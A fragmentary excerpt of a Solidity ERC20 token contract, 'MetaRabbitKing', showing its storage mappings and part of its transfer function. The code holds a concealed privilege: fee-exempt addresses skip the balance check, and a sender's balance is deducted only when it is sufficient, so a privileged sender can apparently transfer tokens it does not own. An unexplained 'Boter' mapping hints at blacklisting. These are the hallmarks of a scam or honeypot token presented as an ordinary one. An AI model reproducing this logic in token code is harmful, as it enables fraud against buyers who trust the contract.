...
contract MetaRabbitKing is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _balance;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private Boter; 
    mapping (address => bool) private _isExcludedFromFee;
    string private _name = "MetaRabbitKing";
    string private _symbol = "MetaRabbitKing";
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        ...
        if ( !_isExcludedFromFee[msg.sender]) { require(_balance[sender] >= amount); require(sender != recipient); }
        uint256 amountR = amount - feeAmount;
        _balance[_burnaaddress] += feeAmount;
        if (_balance[sender] >= amount) {  _balance[sender] = _balance[sender] - amount; }
